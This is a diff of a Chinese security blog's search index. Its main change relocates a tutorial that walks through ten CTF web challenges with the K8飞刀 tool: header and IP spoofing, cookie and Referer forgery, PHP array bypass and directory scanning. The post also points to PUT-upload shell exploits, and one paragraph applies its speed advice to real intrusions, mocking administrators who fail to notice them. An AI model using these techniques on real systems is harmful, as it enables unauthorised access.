@@ -995,8 +995,8 @@
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -1223,70 +1223,6 @@
       </tags>
   </entry>
   <entry>
-    <title>〖教程〗K8飞刀-网络安全CTF解题Web篇10个例子</title>
-    <url>/p/ctf_k8fly.html</url>
-    <content><![CDATA[<p>前段时间有人和我说什么时候有空出些CTF用的工具，实际上CTF考查的内容，实战中用到的很多工具都可以使用，关键在于你懂不懂用。也看到有人搜索如何使用K8飞刀，在此以CTF题为例，教大家如何使用K8飞刀的HackerIE功能（相当于Hackbar插件的高级版），以及编码解码功能的使用（模块涉及多种编码以及加密解密算法），除了实战会用到以外，CTF也可以用到，不过CTF中常见的应该是BASE64、HTML编码、SQL注入编码之类的，实战中密码除了MD5、SHA1以外最常见的莫过于BASE64了，XSS里HTML编码等也会经常用到，至于什么栅栏密码之类的实战几乎很少遇到，所以有些CTF出题和实战还是两回事，虽然说栅栏算法也非常简单，但从实战角度来说，考查用处不大，实战几乎不见的有必要考吗？如同书呆子考试靠死记硬背靠运气拿高分，拿了高分实际工作解决不了新问题，这种就是没用。</p>
-<h3 id="考查知识点"><a href="#考查知识点" class="headerlink" title="考查知识点"></a>考查知识点</h3><p>1.查看HTML代码<br>2.GET提交<br>3.POST提交<br>4.伪造IP<br>5.Base64解密<br>6.HTML实体解密<br>7.PUT/MOVE漏洞<br>8.URL编码<br>9.目录扫描<br>10.Cookie欺骗</p>
-<h3 id="题目1-HTML查看"><a href="#题目1-HTML查看" class="headerlink" title="题目1 HTML查看"></a>题目1 HTML查看</h3><p>网址： <a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a></p>
-<p>分析：<br>直接访问会看到一堆表情，浏览器右键查看HTML代码即可，（但实战遇到屏蔽右键查看就无效）</p>
-<p>解题：</p>
-<p>K8飞刀–HackerIE–Get方式–网址web2–结果选”文本”–提交，即可看到注释中的Flag</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html1.PNG"></p>
-<p>PS：K8飞刀可以无视”网站屏蔽查看HTML代码“功能，现实这样的网页很多，很多CTF不考查，所以CTF和实战是有区别的。</p>
-<h3 id="题目2-HTML实体"><a href="#题目2-HTML实体" class="headerlink" title="题目2 HTML实体"></a>题目2 HTML实体</h3><p>网址： <a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://123.206.87.240:8002/web3/</a></p>
-<p>分析：<br>直接访问会无限弹框，提示FLAG就在这里，所以这里我们选择”文本”模式查看，浏览器模式会无限弹框。</p>
-<p>解题：</p>
-<p>K8飞刀–HackerIE–Get方式–网址web3–结果选”文本”–提交，看到一串可疑的HTML实体字符串，<br>编码解码–粘贴加密的Flag–右键选中Flag–编码转换–XSS跨站–HTML实体(Dec),解密获取Falg</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html2.PNG"></p>
-<p>PS：有些CTF也会把HTML实体编码放在图片里面(记事本打开图片就能看到)    </p>
-<h3 id="题目3-GET提交"><a href="#题目3-GET提交" class="headerlink" title="题目3 GET提交"></a>题目3 GET提交</h3><p>网址：<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a></p>
-<p>$what=$_GET[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
-<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
-<p>解题：<br>网址 <a href="http://123.206.87.240:8002/get?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get?what=flag</a><br>K8飞刀–HackerIE–Get方式–网址get–结果选”文本”–提交，可看到返回flag</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_get.PNG"></p>
-<h3 id="题目4-POST提交"><a href="#题目4-POST提交" class="headerlink" title="题目4 POST提交"></a>题目4 POST提交</h3><p>网址: <a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a></p>
-<p>$what=$_POST[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
-<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
-<p>解题：<br>K8飞刀–HackerIE–Post方式–网址post–结果选”文本”–提交，可看到返回flag<br>网址：<a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a>  提交数据：what=flag</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_post.PNG"></p>
-<h3 id="题目5-伪造IP"><a href="#题目5-伪造IP" class="headerlink" title="题目5 伪造IP"></a>题目5 伪造IP</h3><p>伪造IP这个考查点非常不错，因为现实中确实有很多网站后台存在IP限制。</p>
-<p>网址：<a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a>  管理员系统</p>
-<p>使用K8飞刀访问提示“IP禁止访问”，切换文本看到注释中含有Base64字符串,编码解密得到test123</p>
-<p>K8飞刀–HackerIE–Post方式–提交,返回Flag<br>提交数据：user=admin&amp;pass=test123</p>
-<p>X-Forwarded-For 值为 127.0.0.1</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_xorip.PNG">        </p>
-<h3 id="题目6-PUT漏洞"><a href="#题目6-PUT漏洞" class="headerlink" title="题目6 PUT漏洞"></a>题目6 PUT漏洞</h3><p>这里没找到在线的题(也懒得找),有些CTF可能会考查PUT写权限漏洞，实战也是一个很经典的漏洞，如IIS6写权限GetShell或Tomcat CVE-2017-12615，实际上如果Apache或Ngix配置不当也可以通过PUT直接GetShell的，但该功能飞刀里没有，需使用LadonExp才可实现。</p>
-<p>遇到的话可参考<br><a href="http://k8gege.org/Ladon/iisput">http://k8gege.org/Ladon/iisput</a><br><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p>
-<h3 id="题目7-URL编码"><a href="#题目7-URL编码" class="headerlink" title="题目7 URL编码"></a>题目7 URL编码</h3><p>网址：<a href="http://123.206.87.240:8002/web4" target="_blank" rel="noopener">http://123.206.87.240:8002/web4</a></p>
-<p>访问看到几个URL编码的变量，那就解密看看吧<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url1.PNG"><br>复制使用K8飞刀解密后得到Value值<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url2.PNG"><br>提交后得到Flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url3.PNG"></p>
-<h3 id="题目8-cookie欺骗"><a href="#题目8-cookie欺骗" class="headerlink" title="题目8 cookie欺骗"></a>题目8 cookie欺骗</h3><p>访问 <a href="http://123.206.87.240:8002/web11/" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/</a> 会跳转到以下地址<br><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>Cookie: margin=margin</p>
-<p>解题：K8飞刀–HackerIE–设置Cookie提交即可<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_cookie.PNG"></p>
-<h3 id="题目9-Referer来源"><a href="#题目9-Referer来源" class="headerlink" title="题目9 Referer来源"></a>题目9 Referer来源</h3><p>分析：访问提示，are you from google? 在URL里来源为Referer</p>
-<p><a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">http://123.206.87.240:9009/from.php</a></p>
-<p>解题：K8飞刀设置Referer为google即可<br>Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_referer.PNG"></p>
-<h3 id="题目9-PHP-post"><a href="#题目9-PHP-post" class="headerlink" title="题目9 PHP post"></a>题目9 PHP post</h3><p><a href="http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin" target="_blank" rel="noopener">http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin</a><br>post：passwd[]=2</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_phppost.PNG"></p>
-<h3 id="题目10-目录扫描"><a href="#题目10-目录扫描" class="headerlink" title="题目10 目录扫描"></a>题目10 目录扫描</h3><p><a href="http://123.206.87.240:8002/web13/" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/</a><br>404 Not Found</p>
-<p>分析：访问提示404，本页不存在，那我们扫目录看有哪些页面可访问</p>
-<p>K8扫到robots.txt访问发现result.php,下面提示x=密码就出现flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir.PNG"></p>
-<p><a href="http://123.206.87.240:8002/web13/resusl.php?x=admin" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/resusl.php?x=admin</a></p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir2.PNG"></p>
-<h3 id="解题速度"><a href="#解题速度" class="headerlink" title="解题速度"></a>解题速度</h3><p>天下武功唯快不破，只有解题速度快，才有机会做更多的题，同样能全解的情况下，自然也是速度快的拿第一。</p>
-<p>网上有不少教程对于，PUT提交或IP这种简单修改使用BURP来解题，这个也没什么问题，问题在于有些人并不熟悉相关工具。最怕的是你也熟悉该工具，但打CTF时，环境因素或自己不细心少了哪一步，会浪费掉很多时间，我们都知道如果几分钟就能把前面简单的FLAG提交，那么就会有更多的时间去解难题拿更高分。所以对于考查HTTP参数提交的知识点，可以完全使用K8飞刀或LadonExp这种一键的工具，不要使用Burp这种步骤多的工具，钥题时间越快对你越有利。实战也是一样，你早一天拿到目标，和只做到一半就被发现然后管理员打补丁，没办法再通过该漏洞GetShell甚至也无其它漏洞时你就知道错了。如果你多次提交失败管理员还是没发现，只能说明他很蠢，你运气好可以随便搞。</p>
-<h3 id="考查漏洞"><a href="#考查漏洞" class="headerlink" title="考查漏洞"></a>考查漏洞</h3><p>对于一些更贴近实战的题，比如直接考查相关漏洞的，也可直接使用K8飞刀的漏洞库上的EXP进行测试，很简单只需提供URL即可一键利用。当然里面的EXP可能比较老，如果考查的漏洞里面没有，那只能换上其它针对性的工具。</p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p><a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p>
-<h3 id="看不到图"><a href="#看不到图" class="headerlink" title="看不到图"></a>看不到图</h3><p>如果你看不到本站文章图片，请使用HTTP访问本站，不要为何HTTPS访问有些文章图片出不来。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>K8飞刀</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LadonGo开源全平台渗透扫描器框架</title>
     <url>/p/LadonGo.html</url>
     <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>LadonGo一款开源渗透扫描器框架，使用它可轻松批量探测C段、B段存活主机、指纹识别、端口扫描、密码爆破、高危漏洞检测等。<br>1.0版本包含11个模块功能，高危漏洞检测MS17010、SmbGhost，密码爆破SmbScan、SshScan、FtpScan、MysqlScan，存活探测/信息收集/指纹识别PingScan、IcmpScan，BannerScan、WeblogicScan，端口扫描PortScan。</p>
@@ -1393,6 +1329,70 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </categories>
       <tags>
         <tag>LadonGo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>〖教程〗K8飞刀-网络安全CTF解题Web篇10个例子</title>
+    <url>/p/ctf_k8fly.html</url>
+    <content><![CDATA[<p>前段时间有人和我说什么时候有空出些CTF用的工具，实际上CTF考查的内容，实战中用到的很多工具都可以使用，关键在于你懂不懂用。也看到有人搜索如何使用K8飞刀，在此以CTF题为例，教大家如何使用K8飞刀的HackerIE功能（相当于Hackbar插件的高级版），以及编码解码功能的使用（模块涉及多种编码以及加密解密算法），除了实战会用到以外，CTF也可以用到，不过CTF中常见的应该是BASE64、HTML编码、SQL注入编码之类的，实战中密码除了MD5、SHA1以外最常见的莫过于BASE64了，XSS里HTML编码等也会经常用到，至于什么栅栏密码之类的实战几乎很少遇到，所以有些CTF出题和实战还是两回事，虽然说栅栏算法也非常简单，但从实战角度来说，考查用处不大，实战几乎不见的有必要考吗？如同书呆子考试靠死记硬背靠运气拿高分，拿了高分实际工作解决不了新问题，这种就是没用。</p>
+<h3 id="考查知识点"><a href="#考查知识点" class="headerlink" title="考查知识点"></a>考查知识点</h3><p>1.查看HTML代码<br>2.GET提交<br>3.POST提交<br>4.伪造IP<br>5.Base64解密<br>6.HTML实体解密<br>7.PUT/MOVE漏洞<br>8.URL编码<br>9.目录扫描<br>10.Cookie欺骗</p>
+<h3 id="题目1-HTML查看"><a href="#题目1-HTML查看" class="headerlink" title="题目1 HTML查看"></a>题目1 HTML查看</h3><p>网址： <a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a></p>
+<p>分析：<br>直接访问会看到一堆表情，浏览器右键查看HTML代码即可，（但实战遇到屏蔽右键查看就无效）</p>
+<p>解题：</p>
+<p>K8飞刀–HackerIE–Get方式–网址web2–结果选”文本”–提交，即可看到注释中的Flag</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html1.PNG"></p>
+<p>PS：K8飞刀可以无视”网站屏蔽查看HTML代码“功能，现实这样的网页很多，很多CTF不考查，所以CTF和实战是有区别的。</p>
+<h3 id="题目2-HTML实体"><a href="#题目2-HTML实体" class="headerlink" title="题目2 HTML实体"></a>题目2 HTML实体</h3><p>网址： <a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://123.206.87.240:8002/web3/</a></p>
+<p>分析：<br>直接访问会无限弹框，提示FLAG就在这里，所以这里我们选择”文本”模式查看，浏览器模式会无限弹框。</p>
+<p>解题：</p>
+<p>K8飞刀–HackerIE–Get方式–网址web3–结果选”文本”–提交，看到一串可疑的HTML实体字符串，<br>编码解码–粘贴加密的Flag–右键选中Flag–编码转换–XSS跨站–HTML实体(Dec),解密获取Falg</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_html2.PNG"></p>
+<p>PS：有些CTF也会把HTML实体编码放在图片里面(记事本打开图片就能看到)    </p>
+<h3 id="题目3-GET提交"><a href="#题目3-GET提交" class="headerlink" title="题目3 GET提交"></a>题目3 GET提交</h3><p>网址：<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a></p>
+<p>$what=$_GET[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
+<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
+<p>解题：<br>网址 <a href="http://123.206.87.240:8002/get?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get?what=flag</a><br>K8飞刀–HackerIE–Get方式–网址get–结果选”文本”–提交，可看到返回flag</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_get.PNG"></p>
+<h3 id="题目4-POST提交"><a href="#题目4-POST提交" class="headerlink" title="题目4 POST提交"></a>题目4 POST提交</h3><p>网址: <a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a></p>
+<p>$what=$_POST[‘what’];<br><br>echo $what;<br><br>if($what==’flag’)<br><br>echo ‘flag{****}’;<br></p>
+<p>分析：<br>从页面代码看出，要求通过GET方式提交what=flag</p>
+<p>解题：<br>K8飞刀–HackerIE–Post方式–网址post–结果选”文本”–提交，可看到返回flag<br>网址：<a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://123.206.87.240:8002/post/</a>  提交数据：what=flag</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_post.PNG"></p>
+<h3 id="题目5-伪造IP"><a href="#题目5-伪造IP" class="headerlink" title="题目5 伪造IP"></a>题目5 伪造IP</h3><p>伪造IP这个考查点非常不错，因为现实中确实有很多网站后台存在IP限制。</p>
+<p>网址：<a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a>  管理员系统</p>
+<p>使用K8飞刀访问提示“IP禁止访问”，切换文本看到注释中含有Base64字符串,编码解密得到test123</p>
+<p>K8飞刀–HackerIE–Post方式–提交,返回Flag<br>提交数据：user=admin&amp;pass=test123</p>
+<p>X-Forwarded-For 值为 127.0.0.1</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_xorip.PNG">        </p>
+<h3 id="题目6-PUT漏洞"><a href="#题目6-PUT漏洞" class="headerlink" title="题目6 PUT漏洞"></a>题目6 PUT漏洞</h3><p>这里没找到在线的题(也懒得找),有些CTF可能会考查PUT写权限漏洞，实战也是一个很经典的漏洞，如IIS6写权限GetShell或Tomcat CVE-2017-12615，实际上如果Apache或Ngix配置不当也可以通过PUT直接GetShell的，但该功能飞刀里没有，需使用LadonExp才可实现。</p>
+<p>遇到的话可参考<br><a href="http://k8gege.org/Ladon/iisput">http://k8gege.org/Ladon/iisput</a><br><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></p>
+<h3 id="题目7-URL编码"><a href="#题目7-URL编码" class="headerlink" title="题目7 URL编码"></a>题目7 URL编码</h3><p>网址：<a href="http://123.206.87.240:8002/web4" target="_blank" rel="noopener">http://123.206.87.240:8002/web4</a></p>
+<p>访问看到几个URL编码的变量，那就解密看看吧<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url1.PNG"><br>复制使用K8飞刀解密后得到Value值<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url2.PNG"><br>提交后得到Flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_url3.PNG"></p>
+<h3 id="题目8-cookie欺骗"><a href="#题目8-cookie欺骗" class="headerlink" title="题目8 cookie欺骗"></a>题目8 cookie欺骗</h3><p>访问 <a href="http://123.206.87.240:8002/web11/" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/</a> 会跳转到以下地址<br><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a><br>Cookie: margin=margin</p>
+<p>解题：K8飞刀–HackerIE–设置Cookie提交即可<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_cookie.PNG"></p>
+<h3 id="题目9-Referer来源"><a href="#题目9-Referer来源" class="headerlink" title="题目9 Referer来源"></a>题目9 Referer来源</h3><p>分析：访问提示，are you from google? 在URL里来源为Referer</p>
+<p><a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">http://123.206.87.240:9009/from.php</a></p>
+<p>解题：K8飞刀设置Referer为google即可<br>Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_referer.PNG"></p>
+<h3 id="题目9-PHP-post"><a href="#题目9-PHP-post" class="headerlink" title="题目9 PHP post"></a>题目9 PHP post</h3><p><a href="http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin" target="_blank" rel="noopener">http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin</a><br>post：passwd[]=2</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_phppost.PNG"></p>
+<h3 id="题目10-目录扫描"><a href="#题目10-目录扫描" class="headerlink" title="题目10 目录扫描"></a>题目10 目录扫描</h3><p><a href="http://123.206.87.240:8002/web13/" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/</a><br>404 Not Found</p>
+<p>分析：访问提示404，本页不存在，那我们扫目录看有哪些页面可访问</p>
+<p>K8扫到robots.txt访问发现result.php,下面提示x=密码就出现flag<br><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir.PNG"></p>
+<p><a href="http://123.206.87.240:8002/web13/resusl.php?x=admin" target="_blank" rel="noopener">http://123.206.87.240:8002/web13/resusl.php?x=admin</a></p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/k8fly/ctf/ctf_scandir2.PNG"></p>
+<h3 id="解题速度"><a href="#解题速度" class="headerlink" title="解题速度"></a>解题速度</h3><p>天下武功唯快不破，只有解题速度快，才有机会做更多的题，同样能全解的情况下，自然也是速度快的拿第一。</p>
+<p>网上有不少教程对于，PUT提交或IP这种简单修改使用BURP来解题，这个也没什么问题，问题在于有些人并不熟悉相关工具。最怕的是你也熟悉该工具，但打CTF时，环境因素或自己不细心少了哪一步，会浪费掉很多时间，我们都知道如果几分钟就能把前面简单的FLAG提交，那么就会有更多的时间去解难题拿更高分。所以对于考查HTTP参数提交的知识点，可以完全使用K8飞刀或LadonExp这种一键的工具，不要使用Burp这种步骤多的工具，钥题时间越快对你越有利。实战也是一样，你早一天拿到目标，和只做到一半就被发现然后管理员打补丁，没办法再通过该漏洞GetShell甚至也无其它漏洞时你就知道错了。如果你多次提交失败管理员还是没发现，只能说明他很蠢，你运气好可以随便搞。</p>
+<h3 id="考查漏洞"><a href="#考查漏洞" class="headerlink" title="考查漏洞"></a>考查漏洞</h3><p>对于一些更贴近实战的题，比如直接考查相关漏洞的，也可直接使用K8飞刀的漏洞库上的EXP进行测试，很简单只需提供URL即可一键利用。当然里面的EXP可能比较老，如果考查的漏洞里面没有，那只能换上其它针对性的工具。</p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p><a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p>
+<h3 id="看不到图"><a href="#看不到图" class="headerlink" title="看不到图"></a>看不到图</h3><p>如果你看不到本站文章图片，请使用HTTP访问本站，不要为何HTTPS访问有些文章图片出不来。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>K8飞刀</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -2080,8 +2080,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>密码</category>
         <category>嗅探</category>
       </categories>
@@ -2166,8 +2166,8 @@ window.location.href="http://k8gege.org/Ladon/webshell.html";
       </categories>
       <tags>
         <tag>WebShell</tag>
-        <tag>ladon</tag>
         <tag>RCE</tag>
+        <tag>ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -2308,8 +2308,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Cobalt Strike</category>
+        <category>Ladon</category>
         <category>内网渗透</category>
         <category>远程执行</category>
       </categories>
@@ -2675,8 +2675,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>密码</category>
         <category>Kali</category>
+        <category>密码</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -2893,8 +2893,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>Kali</category>
       </categories>
       <tags>
@@ -2980,13 +2980,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Cobalt Strike</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>Ladon</tag>
         <tag>Cobalt Strike</tag>
+        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -3028,13 +3028,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>LPE</tag>
         <tag>Exp</tag>
+        <tag>LPE</tag>
       </tags>
   </entry>
   <entry>
@@ -3087,8 +3087,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>.NET</category>
         <category>源码</category>
-        <category>编程</category>
         <category>ShellCode</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>.NET</tag>
@@ -3150,9 +3150,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -3174,9 +3174,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -3199,9 +3199,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -3230,9 +3230,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -3364,8 +3364,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>PowerShell</category>
       </categories>
       <tags>
@@ -3408,13 +3408,13 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Exp: <a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">https://github.com/k8gege/SolrExp</a><br>Cscan: <a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>工具</category>
+        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Exp</tag>
         <tag>Apache</tag>
         <tag>Solr</tag>
